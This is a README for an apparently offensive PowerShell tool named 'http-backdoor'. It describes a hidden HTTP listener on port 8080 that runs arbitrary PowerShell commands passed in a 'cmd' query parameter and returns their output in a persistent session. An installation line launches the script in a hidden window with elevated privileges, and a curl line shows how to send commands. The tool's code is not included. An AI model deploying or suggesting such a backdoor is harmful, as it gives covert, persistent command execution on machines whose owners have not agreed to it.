# About
The http-backdoor allows you to execute powershell commands remotely. The http-backdoor recieves powershell commands through http requests to `http://localhost:8080/backdoor?cmd=<powershell-cmd>` and responds with the resulting output to executing `powershell-cmd`.

The http-backdoor "saves the state" after executing a command. Therefore after the http-backdoor executes a command, any subsequent commands will be executed in the same powershell session.

# Installation
Run the http-backdoor by executing `Start-Process -WindowStyle hidden -FilePath "powershell.exe" -ArgumentList "-file .\http-backdoor.ps1" -VerbRunAs` in powershell. The http-backdoor will allow users to execute commands with the same privileges as the user who installs the backdoor.  

# Usage
Once the http-backdoor is installed, you can execute and recieve the output of powershell commands using `curl http://localhost:8080/backdoor?cmd=<powershell-cmd>`. 